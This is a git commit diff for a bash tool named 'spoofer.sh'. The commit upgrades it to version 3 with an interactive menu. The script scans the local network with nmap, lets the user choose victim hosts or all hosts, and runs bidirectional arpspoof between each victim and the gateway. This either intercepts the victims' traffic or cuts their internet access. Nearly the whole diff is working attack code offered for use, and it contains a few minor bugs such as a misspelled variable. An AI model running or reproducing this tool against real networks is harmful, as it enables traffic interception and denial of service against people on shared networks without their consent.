acce7cfb0c8b3f8181ab73a786bad61560d5950c
Aviv Bintang Aringga <avivbintangaringga90@gmail.com>
2020-03-09 20:32:29 +0700

    Upgrade to version 3 & add Interactive Mode

--- spoofer.sh
+++ spoofer.sh
@@ -1,7 +1,25 @@
 #!/bin/bash
 
 # Script version
-VERSION=2.0
+VERSION=3.0
+
+#
+#   Author: R7FX    (github.com/avivbintangaringga)
+#           MrSyhd  (github.com/syahidnurrohim)
+#
+#   This program is free software: you can redistribute it and/or modify
+#   it under the terms of the GNU General Public License as published by
+#   the Free Software Foundation, either version 3 of the License, or
+#   (at your option) any later version.
+#
+#   This program is distributed in the hope that it will be useful,
+#   but WITHOUT ANY WARRANTY; without even the implied warranty of
+#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#   GNU General Public License for more details.
+#
+#   You should have received a copy of the GNU General Public License
+#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
+#
 
 # Required packages for script to run
 REQUIREMENTS="arpspoof"
@@ -15,11 +33,24 @@ NC="\033[0m"
 func_help()
 {
     echo -e ""
-    echo -e " Usage: $0 start|stop connect|disconnect <target-ip[/cidr]> [excluded-ip]"
+    echo -e " Usage: $0 start|stop connect|disconnect <gateway-ip/cidr> [excluded-ip]"
     echo -e ""
     echo -e "  * connect|disconnect  -> Enable/Disable internet connection on target machine"
     echo -e "  * CIDR is only available from 1 to 32"
     echo -e "  * You can exclude IP Addresses on 4th argument with comma (,) separated"
+    echo -e ""
+}
+
+# Display header
+func_header()
+{
+    clear
+    echo -e ""
+    echo -e ""
+    echo -e "           <------------------>"
+    echo -e "       <-----+ SPOOFER v$VERSION +----->"
+    echo -e "           <------------------>"
+    echo -e ""
     echo -e ""
 }
 
@@ -74,7 +105,7 @@ func_check_prerequires()
 # Do some cleanup
 func_cleanup()
 {
-    echo -e "\n\n   Please wait for the cleanup process to be finished...\n\n"
+    echo -e "\n\n   Please wait for the cleanup and re-arping process to be finished...\n\n"
 
     # Get all child process PIDs (arpspoof)
     local PIDS=$(jobs -pr)
@@ -85,7 +116,7 @@ func_cleanup()
     # Wait for all child background process to fully finish
     wait
 
-    # Restore terminal session
+    # Restore terminal screen
     tput rmcup
 
     # Finally exit
@@ -95,64 +126,21 @@ func_cleanup()
 # Start the attack :)
 func_start_attack()
 {
-    # Move to another terminal session
-    tput smcup
+    func_header
 
-    # Trap func_cleanup function to SIGINT, SIGTERM, and SIGKILL signal
-    # to make sure cleanup is called if CTRL+C is fired or script is killed
-    trap func_cleanup SIGINT SIGTERM SIGKILL
-
-    clear
-    echo -e ""
-    echo -e "      +-----+ Spoofer v$VERSION +-----+"
-    echo -e ""
     echo -e " +"
-    echo -e " | Target IP Address   : $TARGET_NETWORK"
-    echo -e " | Excluded IP Address : $(echo $EXCLUDED_IP | tr ',' ' ')"
+    echo -e " | Target Network      : $NETWORK"
+    echo -e " | Excluded IP Address : $EXCLUDED_IP"
     echo -e " +"
-    echo -e ""
-
-    echo -e "[*] Scanning IP Addresses..."
-
-    # Scan all available IP Address in given network
-    SPOOF_TARGETS=$(nmap -sn -n ${TARGET_NETWORK} | grep for | cut -d ' ' -f 5-)
-
-    # Loop through all IP Address found and remove IP that is in the Excluded IP list
-    for IP in $(echo "$TARGET_IP $EXCLUDED_IP" | tr ',' ' ')
-    do
-        SPOOF_TARGETS=$(echo $SPOOF_TARGETS | sed "s/\<$IP\>//g")
-    done
-
-    # Oh no!, no target is found
-    if [[ -z $SPOOF_TARGETS ]]
-    then
-        # Ask if you want to retry
-        read -n1 -p "[!] No target found! Retry? [Y/n]: " RETRY
-
-        # Check the given input
-        case $RETRY in
-            y|Y) func_start_attack ;;
-            *) func_cleanup ;;
-        esac
-    fi
-
-    # List the targets
-    echo -ne "[*] Targets found:"
-    for IP in $SPOOF_TARGETS
-    do
-        echo -ne " $IP"
-    done
-
     echo -e ""
 
     # Block or forward internet access
-    if [[ $INET == "connect" ]]
+    if [[ $FORWARD_TRAFFIC == true ]]
     then
         echo -e "[*] Forwarding internet access..."
         # Enabling IP Forwarding
         sysctl -q net.ipv4.ip_forward=1
-    elif [[ $INET == "disconnect" ]]
-    then
+    else
         echo -e "[*] Dropping internet access..."
         # Disabling IP Forwarding
         sysctl -q net.ipv4.ip_forward=0
@@ -161,69 +149,262 @@ func_start_attack()
     # Start the ARP Spoofing and print the output
     echo -e "[*] Attack Output:\n"
 
-    for IP in $SPOOF_TARGETS
+    for IP in $TARGET_IP
     do
-        arpspoof -t $IP $TARGET_IP &
-        arpspoof -t $TARGET_IP $IP &
+        arpspoof -t $IP $GATEWAY &
+        arpspoof -t $GATEWAY $IP &
     done
 
     # Loop so that the script isn't exit yet :v
     while true; do sleep 1; done
 }
 
+func_scan_network()
+{
+    func_header
+    echo -e "[*] Scanning network..."
+
+    # Scan all available IP Address in then network
+    SCAN_RESULT=$(nmap -sn $NETWORK | grep "for" | cut -d ' ' -f 5-)
+
+    # Exclude gateway IP and your own IP from the list
+    for IP in $(echo "$GATEWAY $MY_IP")
+    do
+        SCAN_RESULT=$(echo "$SCAN_RESULT" | grep -vw "$IP")
+    done
+
+    # Iterate through the scan result
+    local INDEX=1
+    while read -r IP_AND_HOSTNAME
+    do
+        # Get IP Address
+        IP=$(echo $IP_AND_HOSTNAME | cut -d '(' -f2 | cut -d ')' -f1)
+
+        # Get Hostname
+        HOSTNAME=$(echo $IP_AND_HOSTNAME | cut -d ' ' -f1)
+
+        # Assign scanned host with hostname if available
+        [[ $IP == $HOSTNAME ]] && HOSTS[$INDEX]=$(printf "%s\n" $IP) || HOSTS[$INDEX]=$(printf "%-20s (%s)\n" $IP $HOSTNAME)
+        let 'INDEX++'
+    done < <(echo "$SCAN_RESULT")
+
+    # No IP address on the network, prompting to rescan
+    if [[ -z $SCAN_RESULT ]]
+    then
+        read -n1 -p "[!] No IP Address is detected on the network! Scan again? [Y/n]: " SCAN_AGAIN
+
+        case $SCAN_AGAIN in
+            N|n) func_cleanup ;;
+            *) func_scan_network ;;
+        esac
+    fi
+}
+
+start_interactive_mode()
+{
+    # Open new terminal screen
+    tput smcup
+
+    # Trap func_cleanup so that it will be called if CTRL+C is fired or when script is killed
+    trap func_cleanup SIGINT SIGTERM SIGKILL
+
+    # Print header
+    func_header
+    echo -e "\nSelect Network Interface:\n"
+
+    # Iterate all interface that connected to a network
+    local INDEX=1
+    while read -r IFACE
+    do
+        # Print it
+        printf " %2s)  %-16s %s\n" $INDEX $IFACE
+
+        # Assign the interface to an array
+        IFACE_LIST[$INDEX]=$IFACE
+        let 'INDEX++'
+    done < <(ip -o -f inet addr show | awk '/scope global/ {printf "%20s (%s)\n",$2,$4}')
+
+    # If no interface is connected to a network, then prompt to rescan
+    if [[ -z ${IFACE_LIST[@]} ]]
+    then
+        read -n1 -p "[!] No interface is currently connected to any network! Scan again? [Y/n]: " SCAN_AGAIN
+
+        case $SCAN_AGAIN in
+            N|n) func_cleanup ;;
+            *) func_select_interface ;;
+        esac
+    fi
+
+    # Loop until input is correct
+    while [[ -z $SELECTED_IFACE ]]
+    do
+        # When interface list is only 1, it will be selected as default so you don't have to choose
+        [[ ${#IFACE_LIST[@]} == 1 ]] && SELECTED_IFACE=${IFACE_LIST[1]} && break
+
+        echo -e ""
+        read -p "[Select]: " SELECT
+
+        SELECTED_IFACE=${IFACE_LIST[$SELECT]}
+    done
+
+    # Selected interface
+    INTERFACE=$(echo $SELECTED_IFACE | cut -d ' ' -f1)
+
+    # Selected network
+    NETWORK=$(echo $SELECTED_IFACE | cut -d '(' -f2 | cut -d ')' -f1)
+
+    # Get gateway IP of interface
+    GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")
+
+    # Scan the network
+    func_scan_network
+
+    # Print header
+    func_header
+
+    echo -e " +"
+    echo -e " | Gateway     : $GATEWAY"
+    echo -e " | Excluded IP : $EXCLUDED_IP"
+    echo -e " +"
+    echo -e ""
+    echo -e "Select Target:\n"
+
+    # Iterate all hosts found
+    INDEX=1
+    while [[ $INDEX -le ${#HOSTS[@]} ]]
+    do
+        # Print it
+        printf " %3s)  %s\n" $INDEX "${HOSTS[$INDEX]}"
+
+        # Assign the IP to an array
+        IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
+        let 'INDEX++'
+    done
+
+    echo -e "   *)  All Addresses"
+    echo -e ""
+    read -p "[Select]: " SELECT_IP
+
+    # If all address is selected
+    if [[ ($SELECT_IP == "*" || -z $SELECT_IP) ]]
+    then
+        TARGET_IP="${IP_LIST[@]}"
+
+        # If target is more than 1, then prompt to exclude IP
+        if [[ ${#IP_LIST[@]} -gt 1 ]]
+        then
+            # Print header
+            func_header
+
+            # Prompt to exclude IP
+            read -n1 -p "Do you want to exclude IP Address? [y/N]: " EXCLUDE_PROMPT
+            if [[ $EXCLUDE_PROMPT == "y" || $EXCLUDE_PROMPT == "Y" ]]
+            then
+                func_header
+
+                echo -e " +"
+                echo -e " | Gateway     : $GATEWAY"
+                echo -e " | Excluded IP : $EXCLUDED_IP"
+                echo -e " +"
+                echo -e ""
+                echo -e "Select IP Addresses you want to exclude:\n"
+
+                local INDEX2=1
+                while [[ $INDEX2 -le ${#HOSTS[@]} ]]
+                do
+                    printf " %3s)  %s\n" $INDEX2 "${HOSTS[$INDEX2]}"
+                    let 'INDEX2++'
+                done
+
+                echo -e ""
+                read -p "[Select]: " SELECT_EXCLUDE_IP
+
+                # Remove excluded IP from target list
+                for SELECTED in $(echo $SELECT_EXCLUDE_IP | tr ',' ' ')
+                do
+                    [[ $SELECTED -lt $INDEX2 ]] && TARGET_IP=$(echo $TARGET_IP | sed "s/\<${IP_LIST[$SELECTED]}\>//g")
+                    EXCLUDED_IP="$EXCLUDED_UP ${IP_LIST[$SELECTED]}"
+                done
+    
+                EXCLUDED_IP=$(echo $EXCLUDED_IP | tr -s ' ')
+            fi
+        fi
+    else
+        # Assign selected IP to target list
+        for SELECTED in $(echo $SELECT_IP | tr ',' ' ')
+        do
+            [[ $SELECTED -lt $INDEX ]] && TARGET_IP="$TARGET_IP ${IP_LIST[$SELECTED]}"
+        done
+    fi
+
+    func_header
+
+    # Prompt to forward internet access
+    read -n1 -p "Forward internet access from client? [y/N]: " FORWARD_PROMPT
+
+    case $FORWARD_PROMPT in
+        y|Y) FORWARD_TRAFFIC=true ;;
+        *) ;;
+    esac
+
+    # Finally START THE ATTACK!!!
+    func_start_attack
+}
+
 # Arpspoof is requiring root access
 if [[ $EUID -ne 0 ]] 
 then 
-    echo -e "\n ERR: You must run this script as root.\n"
+    echo -e "\n[!] You must run this script as root.\n"
     exit 1
 fi
 
+# Get all of your IP Addresses
+MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')
+
 INET=$1
 TARGET=$2
-EXCLUDED_IP=$3
+EXCLUDED_IP=$(echo "$MY_IP $3" | tr ',' ' ')
 
 # Call function to check package requirements
 func_check_prerequires
 
+# If no argument is given, then run interactive mode
+[[ -z $INET ]] && start_interactive_mode
+
 # Check argument for internet access
 case $INET in
-    connect|disconnect) ;;
-    *) func_help && exit 1;;
+    connect) FORWARD_TRAFFIC=true ;;
+    disconnect) ;;
+    *) func_help && exit 1 ;;
 esac
 
 # Check argument for target IP
 [[ -z $TARGET ]] && func_help && exit 1
 
 # Check if CIDR is given
-if [[ ! -z `echo $TARGET | grep '/'` ]]
+if [[ ! -z $(echo $TARGET | grep '/') ]]
 then
     # Get the CIDR
     CIDR=$(echo $TARGET | cut -d '/' -f2)
     # Check if the given CIDR is correct
-    [[ $CIDR =~ ^[0-9]+$ ]] && [[ $CIDR -gt 32 || $CIDR -lt 1 ]] && echo -e "\n ERR: Invalid CIDR range! Should be 1-32\n" && exit 1
-    # Assign the CIDR
-    CIDR="/$CIDR"
+    [[ $CIDR =~ ^[0-9]+$ ]] && [[ $CIDR -gt 32 || $CIDR -lt 1 ]] && echo -e "\n[!]Invalid CIDR range! Should be 1-32\n" && exit 1
+else
+    echo -e "\n[!] Invalid network address! CIDR should be given too.\n" && exit 1
 fi
 
 # Get Target IP Address only
-TARGET_IP=$(echo $TARGET | cut -d '/' -f1)
+GATEWAY=$(echo $TARGET | cut -d '/' -f1)
 
 # Append Target IP Address and CIDR 
-TARGET_NETWORK="${TARGET_IP}${CIDR}"
-
-# Get your IP Addresses
-MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ',')
-
-# Add your IP Addresses to the exclusion list so that you don't spoof yourself xD
-EXCLUDED_IP="${MY_IP}${EXCLUDED_IP}"
+NETWORK="${GATEWAY}/${CIDR}"
 
 # Loop through all IP Addresses to validate IP Address format
-for IP in $(echo "$TARGET_IP $EXCLUDED_IP" | tr ',' ' ')
+for IP in "$GATEWAY $EXCLUDED_IP"
 do
     # Call the function to validate IP Address
     if ! func_check_ip $IP
     then
-        echo -e " ERR: Invalid IP Address: $IP"
+        echo -e "[!] Invalid IP Address: $IP"
         # Flag invalid IP Address
         INVALID_IP=true
     fi
@@ -231,6 +412,28 @@ done
 
 # If there is an invalid IP Address then exit
 [[ ! -z $INVALID_IP ]] && exit 1
+
+# Open new terminal screen
+tput smcup
+
+# Trap func_cleanup on Interrupt (CTRL+C), Terminate, and Kill signal
+trap func_cleanup SIGINT SIGTERM SIGKILL
+
+# Scan the network
+func_scan_network
+
+# Assign scanned hosts to target list
+for HOST in "${HOSTS[@]}"
+do
+    IP=$(echo "$HOST" | cut -d ' ' -f1)
+    TARGET_IP="$TARGET_IP $IP"
+done
+
+# Remove excluded IP from target list
+for IP in $EXCLUDED_IP
+do
+    TARGET_IP=$(echo "$TARGET_IP" | sed "s/\<$IP\>//g")
+done
 
 # Finally START THE ATTACK!!!
 func_start_attack
